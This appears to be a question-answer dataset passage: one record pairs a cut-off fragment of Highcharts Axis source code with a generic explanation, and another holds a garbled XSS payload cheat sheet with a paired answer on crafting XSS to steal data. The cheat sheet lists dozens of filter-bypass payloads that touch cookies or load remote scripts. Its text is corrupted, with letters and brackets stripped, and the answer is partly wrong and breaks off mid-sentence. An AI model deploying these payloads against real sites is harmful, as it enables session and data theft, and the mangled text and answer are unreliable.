options.snap, true), chart = this.chart;\n        var path, pos, categorized, graphic = this.cross, crossOptions;\n        fireEvent(this, 'drawCrosshair', { e: e, point: point });\n        if (!e) {\n            e = this.cross && this.cross.e;\n        }\n        if (\n        // Disabled in options\n       !options ||\n            // Snap\n            ((defined(point) ||!snap) === false)) {\n            this.hideCrosshair();\n        }\n        else {\n            // Get the path\n            if (!snap) {\n                pos = e &&\n                    (this.horiz?\n                        e.chartX - this.pos :\n                        this.len - e.chartY + this.pos);\n            }\n            else if (defined(point)) {\n                // #3834\n                pos = pick(this.coll!== 'colorAxis'?\n                    null, this.isXAxis?\n                    point.plotX :\n                    this.len - point.plotY);\n            }\n            if (defined(pos)) {\n                crossOptions = {\n                    // value, only used on radial\n                    value: point && (this.isXAxis?\n                        point.x :\n                        pick(point.stackY, point.y)),\n                    translatedValue: pos\n                };\n                if (chart.polar) {\n                    extend(crossOptions, {\n                        isCrosshair: true,\n                        chartX: e && e.chartX,\n                        chartY: e && e.chartY,\n                        point: point\n                    });\n                }\n                path = this.getPlotLinePath(crossOptions) ||\n                    null; // #3189\n            }\n            if (!defined(path)) {\n                this.hideCrosshair();\n                return;\n            }\n            categorized = this.categories &&!this.isRadial;\n            if (!graphic) {\n                this.cross = graphic = chart.renderer\n                   .path()\n                   .addClass('highcharts-crosshair highcharts-crosshair-' +\n                    (categorized? 'category': 'thin ') +\n                    (options.className || ''))\n                   .attr({\n                    zIndex: pick(options.zIndex, 2)\n                })\n                   .add();\n                // Presentational attributes\n                if (!chart.styledMode) {\n                    graphic.attr({\n                        stroke: options.color ||\n                            (categorized?\n                                Color\n                                   .parse(\"#ccd6eb\"\n)\n                                   .setOpacity(0.25)\n                                   .get() :\n                                \"#cccccc\"\n),\n                       'stroke-width': pick(options.width, 1)\n                    }).css({\n                        'pointer-events': 'none'\n                    });\n                    if (options.dashStyle) {\n                        graphic.attr({\n                            dashstyle: options.dashStyle\n                        });\n                    }\n                }\n            }\n            graphic.show().attr({\n                d: path\n            });\n            if (categorized &&!options.width) {\n                graphic.attr({\n                   'stroke-width': this.transA\n                });\n            }\n            this.cross.e = e;\n        }\n        fireEvent(this, 'afterDrawCrosshair', { e: e, point: point });\n    };\nAxis.prototype.hideCrosshair = function () {\n        if (this.cross) {\n            this.cross.hide();\n        }\n        fireEvent(this, 'afterHideCrosshair');\n    };\nAxis.prototype.hasVerticalPanning = function () {\n        var panningOptions = this.chart.options.chart.panning;\n        return Boolean(panningOptions &&\n            panningOptions.enabled && // #14624\n            /y/.test(panningOptions.type));\n    };\nAxis.prototype.validatePositiveValue = function (value) {\n        return isNumber(value) && value > 0;\n    };\nAxis.prototype.update = function (options, redraw) {\n        var chart = this.chart;\n        options = merge(this.userOptions, options);\n        this.destroy(true);\n        this.init(chart, options);\n        chart.isDirtyBox = true;\n        if (pick(redraw, true)) {\n            chart.redraw();\n        }\n    };\nAxis.prototype.remove = function (redraw) {\n        axisSeries = this.series;\n        var i = axisSeries.length;\n        while (i--) {\n            if (axisSeries[i]) {\n                axisSeries[i].remove(false);\n            }\n        }\n        // Remove the axis\n        erase(chart.axes, this);\n        erase(chart[key], this);\n        chart[key].forEach(function (axis, i) {\n            // Re-index, #1706, #8075\n            axis.options.index = axis.userOptions.index = i;\n        });\n        this.destroy();\n        chart.isDirtyBox = true;\n        if (pick(redraw, true)) {\n            chart.redraw();\n        }\n    };\nAxis.prototype.setTitle = function (titleOptions, redraw) {\n        this.update({ title: titleOptions }, redraw);\n    };\nAxis.prototype.setCategories = function (categories, redraw) {\n        this.update({ categories: categories }, redraw);\n    };\nAxis.defaultOptions = AxisDefaults.defaultXAxisOptions;\n    // Properties to survive after destroy, needed for Axis.update (#4317,\n    // #5773, #5881).\n    Axis.keepProps = ['extKey', 'hcEvents', 'names','series', 'userMax', 'userMin'];\n    return Axis;\n}());\n/* *\n *\n *  Default Export\n *\n * */\nexport default Axis;", "question": " What is the purpose of the custom Axis object in the given text?", "answer": " The purpose of the custom Axis object in the given text is to implement the axis functionality in Highcharts. It handles the rendering and layout of the axis, handles tick positions, handles rendering of grid lines and tick labels, etc. It abstracts the logic for creating and managing the different types of axes like X, Y, color, etc. The custom Axis object provides the main axis logic for Highcharts.\n\nSo in summary, the purpose of the custom Axis object is to encapsulate the logic for handling the axes in Highcharts, allowing the chart to be created and rendered without having to directly manage the axes themselves."}
{"text": "xss payload\nxss 重要的是根据输出来判断过滤器的规则,f12,构造自己的xss payload,分割,关闭括号,错误后判断过滤规则,寻找绕过 1.最简单: scriptalert(1)script 2.简单url编码: %22img src=1 onerror =alert(xss)； 3.过滤, javascript:alert(1) \"onmo seover=\"alert(1) 定义和用法 onmo seover 事件会在鼠标指针移动到指定的对象上时发生。 语法 onmo seover=\"alert(1)\" 4.跳出 view plaincopyprint onmo seover=alert(1) 常用的payloads: img src=1onmo seover=alert(1) a herf=1onload=alert(1)xxa bodyonhashchange=alert(1)ahref=#clickit (当锚出现变化时触发弹框) objectdata=\"data:textl；base64,phnjcmlwdcbzcmm9ahr0cdovl3q y24vukd1v0reuz48l3njcmlwdd4=\"object \"svgonload=alert(1) inp t标签xss(a tofoc s自动触发,注意属性hidden时,无法触发) 112\" name=javascript:alert(1)a tofoc s onfoc s=location= 112\" name=javascript:alert1a tofoc s onfoc s=location=   note: this is a technical attack sheet for cross site penetrationtests. cross site scripting strings with tag: meta http-eq iv=\"refresh\" content=\"0； rl=javascript:doc ment.cookie=tr e；\" meta http-equiv=\"set-cookie\" content=\"userscriptdoc ment.cookie=tr escript\" scriptdoc ment.cookie=tr e；script img src=\"jav ascript:doc ment.cookie=tr e；\" img src=\"javascript:doc ment.cookie=tr e；\" img src=\" javascript:doc ment.cookie=tr e；\" body onload！#$%&-_.,:；？@[|]^ˋ=doc ment.cookie=tr e； scriptdoc ment.cookie=tr e；script script bdoc ment.cookie=tr e；script img src=\"javascript:doc ment.cookie=tr e；\" iframe src=\"javascript:doc ment.cookie=tr e； scripta=crosssitescriptingndoc ment.cookie=tr e；script titlescriptdoc ment.cookie=tr e；script input type=\"image\" src=\"javascript:doc ment.cookie=tr e；\" body background=\"javascript:doc ment.cookie=tr e；\" body onload=doc ment.cookie=tr e； img dynsrc=\"javascript:doc ment.cookie=tr e；\" img lowsrc=\"javascript:doc ment.cookie=tr e；\" bgsound src=\"javascript:doc ment.cookie=tr e；\" br size=\"&{doc ment.cookie=tr e}\" layer src=\"javascript:doc ment.cookie=tr e；\"layer link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e；\" styleli {list-style-image: rl(\"javascript:doc ment.cookie=tr e；\")；styleullicrosssitescripting ¼script¾doc ment.cookie=tr e；¼script¾ iframe src=\"javascript:doc ment.cookie=tr e；\"iframe framesetframe src=\"javascript:doc ment.cookie=tr e；\"frameset table background=\"javascript:doc ment.cookie=tr e；\" tabletd background=\"javascript:doc ment.cookie=tr e；\" div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e；)\" div style=\"backgro nd-image: rl( javascript:doc ment.cookie=tr e；)\" div style=\"width: expression(doc ment.cookie=tr e)；\" style@import javascript:doc ment.cookie=tr e ；style img style=\"crosssitescripting:exprcrosssitescriptingession(doc ment.cookie=tr e)\" crosssitescripting style=\"crosssitescripting:expression(doc ment.cookie=tr e)\" expa style= nocrosssitescripting:nocrosssitescripting(\"\")；crosssitescripting:excrosssitescriptingpression(doc ment.cookie=tr e)  style type=\"textjavascript\"doc ment.cookie=tr e；style style.crosssitescripting{backgro nd-image: rl(\"javascript:doc ment.cookie=tr e\")；}stylea class=crosssitescriptinga style type=\"textcss\"body{backgro nd: rl(\"javascript:doc ment.cookie=tr e\")}style scriptdoc ment.cookie=tr e；script base href=\"javascript:doc ment.cookie=tr e；\" object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:doc ment.cookie=tr eobject xml ixc！[[img src=\"javas！[[cript:doc ment.cookie=tr e；\"cxxmlspan datasrc=#i datafld=c dataformatas=lspan xml \"crosssitescripting\"ibimg src=\"javascript:doc ment.cookie=tr e\"bixmlspan datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span lbody？xml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\"？import namespace=\"t\" implementation=\"#defa lt#time2\"t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferdoc ment.cookie=tr escript\"bodyl ？ echo( scr) ；echo( iptdoc ment.cookie=tr escript )； ？ headmeta http-equiv=\"content-type\" content=\"textl； charset=utf-7\" head+adw-script+ad4-doc ment.cookie=tr e；+adw-script+ad4- a href=\"javascript#doc ment.cookie=tr e；\" div onmo seover=\"doc ment.cookie=tr e；\" ！[](javascript:doc ment.cookie=tr e；) ！[](javascript:doc ment.cookie=tr e；) inp t type=\"image\" dynsrc=\"javascript:doc ment.cookie=tr e；\" bgso nd src=\"javascript:doc ment.cookie=tr e；\" &scriptdoc ment.cookie=tr e；script &{doc ment.cookie=tr e；}； img src=&{doc ment.cookie=tr e；}； link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e；\" a href=\"abo t:scriptdoc ment.cookie=tr e；script\" body onload=\"doc ment.cookie=tr e；\" div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e；)；\" div style=\"behavio r: rl([link to code])；\" div style=\"binding: rl([link to code])；\" div style=\"width: expression(doc ment.cookie=tr e；)；\" style type=\"textjavascript\"doc ment.cookie=tr e；style object class\"clsid:...\" codebase=\"javascript:doc ment.cookie=tr e；\" stylescript scriptdoc ment.cookie=tr e；script scriptdoc ment.cookie=tr e；--script scriptdoc ment.cookie=tr e；script img src=\"blah\" onmo seover=\"doc ment.cookie=tr e；\" xml src=\"javascript:doc ment.cookie=tr e；\" xml \"x\"abscriptdoc ment.cookie=tr e；script；baxml div datafld=\"b\" dataformatas=\"l\" datasrc=\"#x\"div ]！[[ [xc0][xbc]scriptdoc ment.cookie=tr e；[xc0][xbc]script cross site scripting strings with close tag: \"meta http-eq iv=\"refresh\" content=\"0； rl=javascript:doc ment.cookie=tr e；\" \"meta http-equiv=\"set-cookie\" content=\"userscriptdoc ment.cookie=tr escript\" \"scriptdoc ment.cookie=tr e；script \"img src=\"jav ascript:doc ment.cookie=tr e；\" \"img src=\"javascript:doc ment.cookie=tr e；\" \"img src=\" javascript:doc ment.cookie=tr e；\" \"body onload！#$%&-_.,:；？@[|]^ˋ=doc ment.cookie=tr e； \"scriptdoc ment.cookie=tr e；script \"script bdoc ment.cookie=tr e；script \"img src=\"javascript:doc ment.cookie=tr e；\" \"iframe src=\"javascript:doc ment.cookie=tr e； \"scripta=crosssitescriptingndoc ment.cookie=tr e；script \"titlescriptdoc ment.cookie=tr e；script \"input type=\"image\" src=\"javascript:doc ment.cookie=tr e；\" \"body background=\"javascript:doc ment.cookie=tr e；\" \"body onload=doc ment.cookie=tr e； \"img dynsrc=\"javascript:doc ment.cookie=tr e；\" \"img lowsrc=\"javascript:doc ment.cookie=tr e；\" \"bgsound src=\"javascript:doc ment.cookie=tr e；\" \"br size=\"&{doc ment.cookie=tr e}\" \"layer src=\"javascript:doc ment.cookie=tr e；\"layer \"link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e；\" \"styleli {list-style-image: rl(\"javascript:doc ment.cookie=tr e；\")；styleullicrosssitescripting \"¼script¾doc ment.cookie=tr e；¼script¾ \"iframe src=\"javascript:doc ment.cookie=tr e；\"iframe \"framesetframe src=\"javascript:doc ment.cookie=tr e；\"frameset \"table background=\"javascript:doc ment.cookie=tr e；\" \"tabletd background=\"javascript:doc ment.cookie=tr e；\" \"div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e；)\" \"div style=\"backgro nd-image: rl( javascript:doc ment.cookie=tr e；)\" \"div style=\"width: expression(doc ment.cookie=tr e)；\" \"style@import javascript:doc ment.cookie=tr e ；style \"img style=\"crosssitescripting:exprcrosssitescriptingession(doc ment.cookie=tr e)\" \"crosssitescripting style=\"crosssitescripting:expression(doc ment.cookie=tr e)\" \"expa style= nocrosssitescripting:nocrosssitescripting(\"\")；crosssitescripting:excrosssitescriptingpression(doc ment.cookie=tr e)  \"style type=\"textjavascript\"doc ment.cookie=tr e；style \"style.crosssitescripting{backgro nd-image: rl(\"javascript:doc ment.cookie=tr e\")；}stylea class=crosssitescriptinga \"style type=\"textcss\"body{backgro nd: rl(\"javascript:doc ment.cookie=tr e\")}style \"scriptdoc ment.cookie=tr e；script \"base href=\"javascript:doc ment.cookie=tr e；\" \"object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:doc ment.cookie=tr eobject \"xml ixc！[[img src=\"javas！[[cript:doc ment.cookie=tr e；\"cxxmlspan datasrc=#i datafld=c dataformatas=lspan \"xml \"crosssitescripting\"ibimg src=\"javascript:doc ment.cookie=tr e\"bixmlspan datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span \"lbody？xml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\"？import namespace=\"t\" implementation=\"#defa lt#time2\"t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferdoc ment.cookie=tr escript\"bodyl \"？ echo( scr) ；echo( iptdoc ment.cookie=tr escript )； ？ \"headmeta http-equiv=\"content-type\" content=\"textl； charset=utf-7\" head+adw-script+ad4-doc ment.cookie=tr e；+adw-script+ad4- \"a href=\"javascript#doc ment.cookie=tr e；\" \"div onmo seover=\"doc ment.cookie=tr e；\" \"！[](javascript:doc ment.cookie=tr e；) \"！[](javascript:doc ment.cookie=tr e；) \"inp t type=\"image\" dynsrc=\"javascript:doc ment.cookie=tr e；\" \"bgso nd src=\"javascript:doc ment.cookie=tr e；\" \"&scriptdoc ment.cookie=tr e；script \"&{doc ment.cookie=tr e；}； \"img src=&{doc ment.cookie=tr e；}； \"link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e；\" \" \" \"a href=\"abo t:scriptdoc ment.cookie=tr e；script\" \"body onload=\"doc ment.cookie=tr e；\" \"div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e；)；\" \"div style=\"behavio r: rl([link to code])；\" \"div style=\"binding: rl([link to code])；\" \"div style=\"width: expression(doc ment.cookie=tr e；)；\" \"style type=\"textjavascript\"doc ment.cookie=tr e；style \"object class\"clsid:...\" codebase=\"javascript:doc ment.cookie=tr e；\" \"stylescript \"scriptdoc ment.cookie=tr e；script \"scriptdoc ment.cookie=tr e；--script \"scriptdoc ment.cookie=tr e；script \" \"img src=\"blah\" onmo seover=\"doc ment.cookie=tr e；\" \"xml src=\"javascript:doc ment.cookie=tr e；\" \"xml \"x\"abscriptdoc ment.cookie=tr e；script；baxml \"div datafld=\"b\" dataformatas=\"l\" datasrc=\"#x\"div ]！[[ [xc0][xbc]scriptdoc ment.cookie=tr e；[xc0][xbc]script cross site scripting strings with negative val e & tag: -1meta http-eq iv=\"refresh\" content=\"0； rl=javascript:doc ment.cookie=tr e；\" -1meta http-equiv=\"set-cookie\" content=\"userscriptdoc ment.cookie=tr escript\" -1scriptdoc ment.cookie=tr e；script -1img src=\"jav ascript:doc ment.cookie=tr e；\" -1img src=\"javascript:doc ment.cookie=tr e；\" -1img src=\" javascript:doc ment.cookie=tr e；\" -1body onload！#$%&-_.,:；？@[|]^ˋ=doc ment.cookie=tr e； -1scriptdoc ment.cookie=tr e；script -1script bdoc ment.cookie=tr e；script -1img src=\"javascript:doc ment.cookie=tr e；\" -1iframe src=\"javascript:doc ment.cookie=tr e； -1scripta=crosssitescriptingndoc ment.cookie=tr e；script -1titlescriptdoc ment.cookie=tr e��script -1input type=\"image\" src=\"javascript:doc ment.cookie=tr e；\" -1body background=\"javascript:doc ment.cookie=tr e；\" -1body onload=doc ment.cookie=tr e； -1img dynsrc=\"javascript:doc ment.cookie=tr e；\" -1img lowsrc=\"javascript:doc ment.cookie=tr e；\" -1bgsound src=\"javascript:doc ment.cookie=tr e；\" -1br size=\"&{doc ment.cookie=tr e}\" -1layer src=\"javascript:doc ment.cookie=tr e；\"layer -1link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e；\" -1styleli {list-style-image: rl(\"javascript:doc ment.cookie=tr e；\")；styleullicrosssitescripting -1¼script¾doc ment.cookie=tr e；¼script¾ -1iframe src=\"javascript:doc ment.cookie=tr e；\"iframe -1framesetframe src=\"javascript:doc ment.cookie=tr e；\"frameset -1table background=\"javascript:doc ment.cookie=tr e；\" -1tabletd background=\"javascript:doc ment.cookie=tr e；\" -1div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e；)\" -1div style=\"backgro nd-image: rl( javascript:doc ment.cookie=tr e；)\" -1div style=\"width: expression(doc ment.cookie=tr e)；\" -1style@import javascript:doc ment.cookie=tr e ；style -1img style=\"crosssitescripting:exprcrosssitescriptingession(doc ment.cookie=tr e)\" -1crosssitescripting style=\"crosssitescripting:expression(doc ment.cookie=tr e)\" -1expa style= nocrosssitescripting:nocrosssitescripting(\"\")；crosssitescripting:excrosssitescriptingpression(doc ment.cookie=tr e)  -1style type=\"textjavascript\"doc ment.cookie=tr e；style -1style.crosssitescripting{backgro nd-image: rl(\"javascript:doc ment.cookie=tr e\")；}stylea class=crosssitescriptinga -1style type=\"textcss\"body{backgro nd: rl(\"javascript:doc ment.cookie=tr e\")}style -1scriptdoc ment.cookie=tr e；script -1base href=\"javascript:doc ment.cookie=tr e；\" -1object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:doc ment.cookie=tr eobject -1xml ixc！[[img src=\"javas！[[cript:doc ment.cookie=tr e；\"cxxmlspan datasrc=#i datafld=c dataformatas=lspan -1xml \"crosssitescripting\"ibimg src=\"javascript:doc ment.cookie=tr e\"bixmlspan datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span -1lbody？xml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\"？import namespace=\"t\" implementation=\"#defa lt#time2\"t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferdoc ment.cookie=tr escript\"bodyl -1？ echo( scr) ；echo( iptdoc ment.cookie=tr escript )； ？ -1headmeta http-equiv=\"content-type\" content=\"textl； charset=utf-7\" head+adw-script+ad4-doc ment.cookie=tr e；+adw-script+ad4- -1a href=\"javascript#doc ment.cookie=tr e；\" -1div onmo seover=\"doc ment.cookie=tr e；\" -1！[](javascript:doc ment.cookie=tr e；) -1！[](javascript:doc ment.cookie=tr e；) -1inp t type=\"image\" dynsrc=\"javascript:doc ment.cookie=tr e；\" -1bgso nd src=\"javascript:doc ment.cookie=tr e；\" -1&scriptdoc ment.cookie=tr e；script -1&{doc ment.cookie=tr e；}； -1img src=&{doc ment.cookie=tr e；}； -1link rel=\"stylesheet\" href=\"javascript:doc ment.cookie=tr e；\" -1 -1 -1a href=\"abo t:scriptdoc ment.cookie=tr e；script\" -1body onload=\"doc ment.cookie=tr e；\" -1div style=\"backgro nd-image: rl(javascript:doc ment.cookie=tr e；)；\" -1div style=\"behavio r: rl([link to code])；\" -1div style=\"binding: rl([link to code])；\" -1div style=\"width: expression(doc ment.cookie=tr e；)；\" -1style type=\"textjavascript\"doc ment.cookie=tr e；style -1object class\"clsid:...\" codebase=\"javascript:doc ment.cookie=tr e；\" -1stylescript -1scriptdoc ment.cookie=tr e；script -1scriptdoc ment.cookie=tr e；--script -1scriptdoc ment.cookie=tr e；script -1 -1img src=\"blah\" onmo seover=\"doc ment.cookie=tr e；\" -1xml src=\"javascript:doc ment.cookie=tr e；\" -1xml \"x\"abscriptdoc ment.cookie=tr e；script；baxml -1div datafld=\"b\" dataformatas=\"l\" datasrc=\"#x\"div ]！[[ [xc0][xbc]scriptdoc ment.cookie=tr e；[xc0][xbc]script cross site scripting strings restriction bypass mail: \"iframe src=http:v  \"scriptalert(doc ment.cookie)scriptdiv style=\" \"scriptalert(doc ment.cookie)script@gmail.com iframe src=http:v  scriptalert(doc ment.cookie)scriptdiv style=\" scriptalert(doc ment.cookie)script@gmail.com cross site scripting strings restriction bypass phone: +49\"iframe src=http:v 1337 \"iframe src= onload=alert( mphone ) iframe src=http:v 1337+1 cross site scripting strings restriction bypass obf scation \"scriptalert(\"vlab\")script \"iframe src=http:v  cross site scripting strings restriction bypass string to charcode lbody b tton.onclick=\"alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108, 101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1 10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62))；\"string:fr om.char.codeb ttonbodyl ；alert(string.fromcharcode(88,83,83)) ；alert(string.fromcharcode(88,83,83))\"；alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))\"；alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))--script\" scriptalert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))script ；！--\"crosssitescripting=&{} cross site scripting strings restriction bypass encoded frame rl %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%43%72%6f %73%73%53%69%74%65%53%63%72%69%70%74%69%6e%67%32%22%29%3c%2f %73%63%72%69%70%74%3e cross site scripting strings via console: set vlan name 1337 scriptalert(doc ment.cookie)script set system name iframe src=  set system location \"iframe src=a onload=alert(\"vl\")  set system contact scriptalert( vl )script insert scriptalert(doc ment.cookie)script add add ser scriptalert(doc ment.cookie)script scriptalert(doc ment.cookie)script@gmail.com add topic iframe src=  add name scriptalert( vl )script perl -e print \"img src=java0script:alert(\"crosssitescripting\")\"；  o t perl -e print \"scr0iptalert(\"crosssitescripting\")scr0ipt\"；  o t cross site scripting strings on per line validation applications: img src = \" j a v a s c r i p t : a l e r t ( v l a b ) \" cross site scripting strings embed: embed src=\"http:v crosssitescripting.swf\" allowscriptaccess=\"always\"embed embed src=\"data:imagesvg+xml；base64,phn2zyb4bwx czpzdmc9imh0dh a6ly93d3c dzm b3jnlziwmdavc3zniib4bwx cz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9 psixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==\" type=\"imagesvg+xml\" allowscriptaccess=\"always\"embed embed src=\"data:imagesvg+xml；base64,phn2zyb4bwx czpzdmc9imh0dh a6ly93d3c dzm b3jnlziwmdavc3zniib4bwx cz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9 psixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==\" type=\"imagesvg+xml\" allowscriptaccess=\"always\"embed cross site scripting strings action script: object type=\"applicationx-shockwave-flash\" data=\" hack.swf\" width=\"300\" height=\"300\" param name=\"movie\" val e=\" \"  param name=\"q ality\" val e=\"high\"  param name=\"scale\" val e=\"noscale\"  param name=\"salign\" val e=\"lt\"  param name=\"allowscriptaccess\" val e=\"always\"  param name=\"men \" val e=\"false\"  object script src=http:v crosssitescripting.jsscript scriptalert(\"crosssitescripting\")；script script src=http:v crosssitescripting.js？b script src=v.js scripta=crosssitescripting alert( rce)script script a=\"\" src=\"http:v crosssitescripting.js\"script script a= src=\"http:v crosssitescripting.js\"script scriptdoc ment.write(\"scri\")；scriptpt src=\"http:v crosssitescripting.js\"script titlescriptalert(\"crosssitescripting\")；script img src=\"javascript:alert( crosssitescripting )；\" img src=javascript:alert( crosssitescripting ) img src=javascript:alert( crosssitescripting ) img src=javascript:alert(\"crosssitescripting\") img src=javascript:alert(\"rm crosssitescripting \") img scriptalert(\"crosssitescripting\")script\" img src=javascript:alert(string.fromcharcode(88,83,83)) img src=\"jav ascript:alert( crosssitescripting )；\" img src=\"jav ascript:alert( crosssitescripting )；\" img src=\"jav ascript:alert( crosssitescripting )；\" img src=\"javascript:alert( crosssitescripting )；\" img src=\" javascript:alert( crosssitescripting )；\" img src=\"javascript:alert( crosssitescripting )\" img dynsrc=\"javascript:alert( crosssitescripting )\" img lowsrc=\"javascript:alert( crosssitescripting )\" img src= vbscript:msgbox(\"crosssitescripting\")  img src=\"mocha:[code]\" img src=\"livescript:[code]\" meta http-equiv=\"refresh\" content=\"0； rl=javascript:alert( crosssitescripting )；\" meta http-equiv=\"refresh\" content=\"0； rl=data:textl；base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k\" meta http-equiv=\"refresh\" content=\"0； url=( crosssitescripting )；\" meta http-equiv=\"refresh\" content=\"0； rl=javascript:alert( crosssitescripting )；\" meta http-equiv=\"refresh\" content=\"0； rl=data:textl；base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k\" meta http-equiv=\"refresh\" content=\"0； url=( crosssitescripting )；\" meta http-equiv=\"link\" content=\"http:v crosssitescripting.css； rel=stylesheet\" meta http-equiv=\"set-cookie\" content=\"userscriptalert( crosssitescripting )script\" headmeta http-equiv=\"content-type\" content=\"textl； charset=utf-7\" head+adw-script+ad4-alert( crosssitescripting )；+adw-script+ad4- object type=\"textx-scriptlet\" data=\"http:v scriptletl\"object object classclsid:ae24fdae-03c6-11d1-8b76-0080c744f389param name= rl val e=javascript:alert( crosssitescripting )object style@import javascript:alert(\"crosssitescripting\") ；style style@import http:v crosssitescripting.css ；style style type=\"textjavascript\"alert( crosssitescripting )；style style.crosssitescripting{backgro nd-image: rl(\"javascript:alert( crosssitescripting )\")；}stylea class=crosssitescriptinga style type=\"textcss\"body{backgro nd: rl(\"javascript:alert( crosssitescripting )\")}style styleli {list-style-image: rl(\"javascript:alert( crosssitescripting )\")；}styleullicrosssitescripting stylebody{-moz-binding: rl(\"http:v crosssitescriptingmoz.xml#crosssitescripting\")}style div style=\"backgro nd-image: rl(javascript:alert( crosssitescripting ))\" div style=\"backgro nd-image:00750072006c0028 006a006100760061007300630072006900700074003a0061006c0065007200740028.10270058.1053005300270029 0029\" div style=\"backgro nd-image: rl( javascript:alert( crosssitescripting ))\" div style=\"width: expression(alert( crosssitescripting ))；\" layer src=\"http:v scriptl\"layer link rel=\"stylesheet\" href=\"javascript:alert( crosssitescripting )；\" link rel=\"stylesheet\" href=\"http:v crosssitescripting.css\" body background=\"javascript:alert( crosssitescripting )\" body onload=alert( crosssitescripting ) body onload！#$%&*-_.,:；？@[|]^ˋ=alert(\"crosssitescripting\") iframe src=http:v indexl  table background=\"javascript:alert( crosssitescripting )\" tabletd background=\"javascript:alert( crosssitescripting )\" bgsound src=\"javascript:alert( crosssitescripting )；\" br size=\"&{alert( crosssitescripting )}\" a href=\"\"crosssitescriptinga a href=\"\"crosssitescriptinga a href=\"\"crosssitescriptinga a href=\"javascript:doc ment.location=   \"crosssitescriptinga base href=\"javascript:alert( crosssitescripting )；\" \"；alert( crosssitescripting )； input type=\"image\" src=\"javascript:alert( crosssitescripting )；\" crosssitescripting style=\"behavior: rl(crosssitescripting.htc)；\" ¼script¾alert(¢crosssitescripting¢)¼script¾ img style=\"crosssitescripting:exprcrosssitescriptingession(alert( crosssitescripting ))\" crosssitescripting style=\"crosssitescripting:expression(alert( crosssitescripting ))\" expa style= nocrosssitescripting:nocrosssitescripting(\"\")； crosssitescripting:excrosssitescripting*pression(alert(\"crosssitescripting\"))  a=\"get\"； b=\"url(\"\"； c=\"javascript:\"； d=\"alert( crosssitescripting )；\")\"； eval(v+l+a+b)； l xmlns:crosssitescripting ？import namespace=\"crosssitescripting\" implementation=\"\" crosssitescripting:crosssitescriptingcrosssitescriptingcrosssitescripting:crosssitescripting xml ixc！[[img src=\"javas]！[[！[[cript:alert( crosssitescripting )；\"]！[[ cxxmlspan datasrc=#i datafld=c dataformatas=lspan xml \"crosssitescripting\"ibimg src=\"javascript:alert( crosssitescripting )\"bixml span datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"l\"span xml src=\"crosssitescriptingtest.xml\" ixmlspan datasrc=#i datafld=c dataformatas=lspan lbody ？xml:namespace prefix=\"t\" ns=\" rn:schemas-microsoft-com:time\" ？import namespace=\"t\" implementation=\"#defa lt#time2\" t:set attrib tename=\"innerl\" to=\"crosssitescriptingscript deferalert(\"crosssitescripting\")script\" bodyl script src=\"http:v crosssitescripting.jpg\"script ？ echo( scr) ； echo( iptalert(\"crosssitescripting\")script )； ？ img src=\" file.php？", "question": " What are some techniques for creating cross-site scripting (XSS) payloads, and what are some ways to bypass security measures to steal sensitive information or perform malicious actions?", "answer": "\n\n        Cross-site scripting (XSS) is a technique used by attackers to inject malicious code into websites or web applications. Some techniques for creating XSS payloads include:\n\n1. scriptalert(1) - This is the simplest and most basic XSS payload. It can be used to steal sensitive information or perform malicious actions.\n\n2. URL encoding - By encoding sensitive data in URLs, attackers can bypass security measures and inject malicious code into websites.\n\n3. Using onload or onmouseover events - These events can be used to inject malicious code that runs when the page loads or when the mouse pointer hovers over an element.\n\n4. Using the document.cookie property - The cookie property can be manipulated to steal sensitive information or perform malicious actions.\n\n5. Using XMLHttpRequest (XHR) - By injecting malicious code into an XHR request, attackers can steal sensitive information or perform malicious actions.\n\nSome ways to bypass security measures to steal sensitive information or perform malicious actions include:\n\n1. Using encoding techniques - By 